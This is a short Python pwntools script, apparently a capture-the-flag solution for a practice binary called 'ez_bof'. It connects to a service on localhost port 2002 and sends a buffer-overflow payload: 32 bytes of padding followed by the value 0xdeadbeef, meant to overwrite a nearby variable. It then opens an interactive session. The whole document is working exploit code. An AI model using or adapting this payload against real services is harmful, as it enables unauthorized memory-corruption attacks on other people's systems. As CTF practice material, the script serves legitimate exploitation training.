from pwn import *

p = remote('127.0.0.1', 2002)
#p = process('./ez_bof') 

padding = b"A" * 32

target_value = p32(0xdeadbeef)

payload = padding + target_value

p.send(payload)

p.interactive()
